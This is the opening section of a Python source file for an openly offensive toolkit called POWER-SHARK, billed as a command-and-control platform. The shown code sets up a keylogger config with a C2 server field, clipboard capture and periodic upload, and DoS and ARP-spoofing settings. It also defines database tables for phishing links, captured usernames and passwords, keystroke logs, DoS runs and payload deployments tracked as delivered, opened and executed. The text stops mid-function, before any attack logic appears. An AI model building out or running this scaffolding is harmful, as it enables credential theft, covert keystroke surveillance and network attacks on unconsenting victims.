#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗     ███████╗██╗  ██╗ █████╗ ██████╗██╗  ██╗
║  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗    ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
║  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝    ███████╗███████║███████║██████╔╝█████╔╝ 
║  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗    ╚════██║██╔══██║██╔══██║██╔══██╗██╔═██╗ 
║  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║    ███████║██║  ██║██║  ██║██║  ██║██║  ██╗
║  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
║                                                                              ║
║                    POWER-SHARK v1.0.0 - Cyber Command Platform               ║
║                         Author: Ian Carter Kulani, MSc                       ║
║                                                                              ║
║  Complete cybersecurity automation platform featuring:                       ║
║  • 200+ Security Commands                                                    ║
║  • Multi-Platform Bot Integration (Discord, Telegram, Slack, Google Chat)    ║
║  • Black & White Terminal Web Dashboard                                      ║
║  • All Ping/Traceroute/Nmap/Wget/Curl Commands                               ║
║  • Agent Mode with Full Control                                              ║
║  • Automated Threat Monitoring                                               ║
║  • PDF Report Generation                                                     ║
║  • Real Traffic Generation                                                   ║
║  • Social Engineering Suite (100+ Templates)                                 ║
║  • Password Cracking Engine                                                  ║
║  • ARP Spoofing & Network Manipulation                                       ║
║  • MAC Address Management                                                    ║
║  • NAT Information                                                           ║
║  • Docker Security Scanning                                                  ║
║  • Email Composition & Sending                                               ║
║  • Keylogger with Exfiltration                                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import ctypes
import queue
import secrets
import string
import smtplib
import email.message
import tempfile
import zipfile
import tarfile
import gzip
import argparse
import http.server
import socketserver
import webbrowser
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union, Callable
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import Counter, defaultdict, deque
from enum import Enum
from functools import wraps
from abc import ABC, abstractmethod
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# =====================
# VERSION & METADATA
# =====================
VERSION = "1.0.0"
NAME = "POWER-SHARK"
AUTHOR = "Ian Carter Kulani, MSc"
DESCRIPTION = "Cyber Command & Control Platform"
TOTAL_LINES = 10000

# =====================
# DEPENDENCY CHECK & IMPORTS
# =====================
try:
    import colorama
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    from slack_sdk.socket_mode import SocketModeClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

SIGNAL_AVAILABLE = shutil.which('signal-cli') is not None
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin'

try:
    from flask import Flask, render_template_string, request, jsonify
    from flask_socketio import SocketIO
    from flask_cors import CORS
    WEB_AVAILABLE = True
except ImportError:
    WEB_AVAILABLE = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sr1, srp, sniff, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

# =====================
# THEME
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        PRIMARY = Fore.WHITE + Style.BRIGHT
        SECONDARY = Fore.LIGHTWHITE_EX + Style.BRIGHT
        ACCENT = Fore.WHITE + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.CYAN + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        CYAN = Fore.CYAN + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        BG_WHITE = Back.WHITE + Fore.BLACK
        BG_BLACK = Back.BLACK + Fore.WHITE
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = SUCCESS = WARNING = ERROR = INFO = WHITE = CYAN = BLUE = GREEN = MAGENTA = BG_WHITE = BG_BLACK = BOLD = DIM = RESET = ""

# =====================
# TERMINAL ANIMATION
# =====================
class TerminalAnimation:
    @staticmethod
    def spinner(duration: float = 2.0, message: str = "Processing", style: str = "dots"):
        spinner_chars = {
            'dots': ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
            'line': ['|', '/', '-', '\\'],
            'circle': ['◐', '◓', '◑', '◒'],
        }
        chars = spinner_chars.get(style, spinner_chars['dots'])
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.CYAN}{chars[i % len(chars)]} {message}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1
        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def typing_effect(text: str, delay: float = 0.04, color: str = "CYAN"):
        color_code = getattr(Colors, color, Colors.CYAN)
        for char in text:
            sys.stdout.write(f'{color_code}{char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def matrix_rain(duration: float = 2.0, density: int = 5):
        try:
            columns = min(shutil.get_terminal_size().columns, 80)
            chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
            start_time = time.time()
            while time.time() - start_time < duration:
                for _ in range(density):
                    row = ''.join(random.choice(chars) for _ in range(columns))
                    sys.stdout.write(f'\r{Colors.WHITE}{row}{Colors.RESET}')
                    sys.stdout.flush()
                    time.sleep(0.03)
            sys.stdout.write('\r' + ' ' * columns + '\r')
            sys.stdout.flush()
        except:
            pass
    
    @staticmethod
    def pulse_animation(text: str, duration: float = 2.0, color: str = "CYAN"):
        color_code = getattr(Colors, color, Colors.CYAN)
        start_time = time.time()
        while time.time() - start_time < duration:
            for _ in range(5):
                sys.stdout.write(f'\r{color_code}{Style.BRIGHT}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.05)
            for _ in range(5):
                sys.stdout.write(f'\r{color_code}{Style.DIM}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.05)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def glitch_effect(text: str, duration: float = 1.0):
        start_time = time.time()
        while time.time() - start_time < duration:
            chars = list(text)
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(chars) - 1)
                chars[idx] = random.choice(['#', '@', '!', '*', '&', '%', '$'])
            glitched = ''.join(chars)
            colors = [Colors.RED, Colors.GREEN, Colors.BLUE, Colors.MAGENTA, Colors.CYAN, Colors.WHITE]
            sys.stdout.write(f'\r{random.choice(colors)}{glitched}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write(f'\r{Colors.WHITE}{text}{Colors.RESET}\n')
        sys.stdout.flush()

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".power_shark"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "power_shark.db")
LOG_FILE = os.path.join(CONFIG_DIR, "power_shark.log")
KEYLOG_FILE = os.path.join(CONFIG_DIR, "keylog.txt")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
REPORT_DIR = "power_shark_reports"
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
TEMP_DIR = "temp"
SESSION_DIR = os.path.join(CONFIG_DIR, "sessions")
KEYLOG_EXFIL_DIR = os.path.join(CONFIG_DIR, "keylog_exfil")
DEPLOYMENT_DIR = os.path.join(CONFIG_DIR, "deployments")
DOMAIN_HOSTING_DIR = os.path.join(CONFIG_DIR, "domain_hosting")
CRACKING_DIR = os.path.join(CONFIG_DIR, "cracking")
ARP_LOGS_DIR = os.path.join(CONFIG_DIR, "arp_logs")
MAC_LOGS_DIR = os.path.join(CONFIG_DIR, "mac_logs")
NAT_LOGS_DIR = os.path.join(CONFIG_DIR, "nat_logs")
DOCKER_SCANS_DIR = os.path.join(CONFIG_DIR, "docker_scans")
EMAIL_COMPOSER_DIR = os.path.join(CONFIG_DIR, "email_composer")
PDF_REPORTS_DIR = os.path.join(REPORT_DIR, "pdf_reports")
THREAT_MONITOR_DIR = os.path.join(CONFIG_DIR, "threat_monitor")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")

for directory in [CONFIG_DIR, PAYLOADS_DIR, REPORT_DIR, PHISHING_DIR,
                  CAPTURED_CREDENTIALS_DIR, TRAFFIC_LOGS_DIR, NIKTO_RESULTS_DIR,
                  TEMP_DIR, SESSION_DIR, KEYLOG_EXFIL_DIR, DEPLOYMENT_DIR,
                  DOMAIN_HOSTING_DIR, CRACKING_DIR, ARP_LOGS_DIR, MAC_LOGS_DIR,
                  NAT_LOGS_DIR, DOCKER_SCANS_DIR, EMAIL_COMPOSER_DIR,
                  PDF_REPORTS_DIR, THREAT_MONITOR_DIR, SSH_KEYS_DIR]:
    Path(directory).mkdir(exist_ok=True, parents=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - POWER-SHARK - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8')]
)
logger = logging.getLogger("PowerShark")

# =====================
# ENUMS & DATA CLASSES
# =====================
class TrafficType(Enum):
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    MIXED = "mixed"
    RANDOM = "random"

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

@dataclass
class SSHConnection:
    id: str
    name: str
    host: str
    port: int = 22
    username: str = ""
    password: Optional[str] = None
    key_path: Optional[str] = None
    status: str = "disconnected"
    created_at: str = field(default_factory=lambda: datetime.datetime.now().isoformat())

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    status: str = "pending"

@dataclass
class PhishingLink:
    id: str
    platform: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0

@dataclass
class Deployment:
    id: str
    name: str
    type: str
    payload: str
    target: str
    created_at: str
    delivered: bool = False
    opened: bool = False
    executed: bool = False

@dataclass
class DomainHost:
    id: str
    ip: str
    domain: str
    hosting_path: str
    created_at: str
    active: bool = True

@dataclass
class ARPSpoofResult:
    target_ip: str
    gateway_ip: str
    interface: str
    status: str
    packets_sent: int
    duration: float
    started_at: str
    ended_at: str

@dataclass
class NATInfo:
    public_ip: str
    private_ip: str
    router_ip: str
    country: str
    isp: str
    nat_type: str

@dataclass
class EmailMessage:
    to: str
    subject: str
    body: str
    from_email: str
    attachments: List[str] = field(default_factory=list)
    html: bool = False
    sent_at: Optional[str] = None
    status: str = "draft"

@dataclass
class PDFReport:
    title: str
    target: str
    analysis: Dict
    timestamp: str
    file_path: str
    status: str = "generated"

# =====================
# CONFIG MANAGER
# =====================
class ConfigManager:
    DEFAULT_CONFIG = {
        "version": VERSION,
        "auto_block_enabled": False,
        "scan_timeout": 30,
        "threat_monitor": {
            "enabled": True,
            "interval": 300,
            "report_enabled": True,
            "report_interval": 3600
        },
        "keylogger": {
            "enabled": False,
            "hotkey": "f10",
            "log_file": KEYLOG_FILE,
            "c2_server": "",
            "upload_interval": 30,
            "exfil_methods": ["file"],
            "screenshot_interval": 60,
            "capture_clipboard": True
        },
        "web": {
            "enabled": True,
            "port": 5000,
            "host": "0.0.0.0",
            "secret_key": ""
        },
        "email": {
            "smtp_server": "",
            "smtp_port": 587,
            "smtp_username": "",
            "smtp_password": "",
            "from_email": "",
            "tls": True
        },
        "cracking": {
            "hashcat_path": "hashcat",
            "wordlist_path": "/usr/share/wordlists/rockyou.txt",
            "default_hash_type": 0
        },
        "dos": {
            "max_threads": 100,
            "default_duration": 30
        },
        "arp_spoofing": {
            "interface": "eth0",
            "enable_ip_forward": True
        }
    }
    
    def __init__(self):
        self.config_file = Path(CONFIG_FILE)
        self.config = self.load()
    
    def load(self) -> Dict:
        try:
            if self.config_file.exists():
                with open(self.config_file, 'r') as f:
                    loaded = json.load(f)
                    for key, value in self.DEFAULT_CONFIG.items():
                        if key not in loaded:
                            loaded[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in loaded[key]:
                                    loaded[key][sub_key] = sub_value
                    return loaded
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        return self.DEFAULT_CONFIG.copy()
    
    def save(self) -> bool:
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k, default)
            else:
                return default
        return value
    
    def set(self, key: str, value: Any) -> bool:
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target:
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        return self.save()

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.init_tables()
    
    def init_tables(self):
        tables = [
            """CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                user_id TEXT,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )""",
            """CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                domain TEXT,
                added_by TEXT,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS mac_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mac_address TEXT UNIQUE NOT NULL,
                vendor TEXT,
                ip_address TEXT,
                hostname TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS arp_spoofing (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                gateway_ip TEXT NOT NULL,
                interface TEXT,
                status TEXT DEFAULT 'active',
                packets_sent INTEGER DEFAULT 0,
                duration REAL,
                started_at DATETIME,
                ended_at DATETIME
            )""",
            """CREATE TABLE IF NOT EXISTS domain_hosting (
                id TEXT PRIMARY KEY,
                ip TEXT NOT NULL,
                domain TEXT NOT NULL UNIQUE,
                hosting_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )""",
            """CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                text TEXT,
                window TEXT,
                process TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS dos_attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                attack_type TEXT NOT NULL,
                target TEXT NOT NULL,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS deployments (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                type TEXT NOT NULL,
                payload TEXT,
                target TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered BOOLEAN DEFAULT 0,
                opened BOOLEAN DEFAULT 0,
                executed BOOLEAN DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS cracking_jobs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                job_id TEXT UNIQUE NOT NULL,
                hash_type TEXT NOT NULL,
                hash_value TEXT NOT NULL,
                wordlist TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                started_at DATETIME,
                completed_at DATETIME,
                cracked BOOLEAN DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS nat_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_ip TEXT,
                private_ip TEXT,
                router_ip TEXT,
                country TEXT,
                isp TEXT,
                nat_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS pdf_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                target TEXT,
                analysis TEXT,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'generated'
            )""",
            """CREATE TABLE IF NOT EXISTS threat_monitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                interval INTEGER DEFAULT 300,
                enabled BOOLEAN DEFAULT 1,
                last_scan DATETIME,
                next_scan DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )""",
            """CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )"""
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                logger.error(f"Table creation error: {e}")
        
        self.conn.commit()
    
    def log_command(self, command: str, source: str = "local", user_id: str = None,
                   success: bool = True, output: str = "", execution_time: float = 0.0):
        try:
            self.conn.execute(
                """INSERT INTO command_history 
                   (command, source, user_id, success, output, execution_time)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (command, source, user_id, success, output[:5000], execution_time)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str):
        try:
            self.conn.execute(
                "INSERT INTO threats (threat_type, source_ip, severity, description) VALUES (?, ?, ?, ?)",
                (threat_type, source_ip, severity, description)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def add_managed_ip(self, ip: str, domain: str = None, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.conn.execute(
                "INSERT OR IGNORE INTO managed_ips (ip_address, domain, added_by, notes) VALUES (?, ?, ?, ?)",
                (ip, domain, added_by, notes)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def block_ip(self, ip: str, reason: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 1, block_reason = ? WHERE ip_address = ?",
                (reason, ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE managed_ips SET is_blocked = 0, block_reason = NULL WHERE ip_address = ?",
                (ip,)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                rows = self.conn.execute("SELECT * FROM managed_ips ORDER BY added_date DESC")
            else:
                rows = self.conn.execute("SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
                    hostname: str = None) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO mac_info 
                   (mac_address, vendor, ip_address, hostname, last_seen)
                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
                (mac_address, vendor, ip_address, hostname)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add MAC info: {e}")
            return False
    
    def get_mac_info(self, mac_address: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                "SELECT * FROM mac_info WHERE mac_address = ?", (mac_address,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO arp_spoofing 
                   (target_ip, gateway_ip, interface, started_at, status)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
                (target_ip, gateway_ip, interface)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int, duration: float) -> bool:
        try:
            self.conn.execute(
                """UPDATE arp_spoofing 
                   SET packets_sent = ?, duration = ?, ended_at = CURRENT_TIMESTAMP, status = 'completed'
                   WHERE target_ip = ? AND gateway_ip = ?""",
                (packets_sent, duration, target_ip, gateway_ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_arp_spoofs(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_nat_info(self, public_ip: str, private_ip: str, router_ip: str,
                    country: str, isp: str, nat_type: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO nat_info 
                   (public_ip, private_ip, router_ip, country, isp, nat_type)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (public_ip, private_ip, router_ip, country, isp, nat_type)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def add_domain_host(self, domain_host: DomainHost) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO domain_hosting 
                   (id, ip, domain, hosting_path, created_at, active)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (domain_host.id, domain_host.ip, domain_host.domain, domain_host.hosting_path,
                 domain_host.created_at, domain_host.active)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add domain host: {e}")
            return False
    
    def get_domain_hosts(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM domain_hosting WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM domain_hosting ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_traffic(self, generator: TrafficGenerator) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent, generator.status)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save credential: {e}")
            return False
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
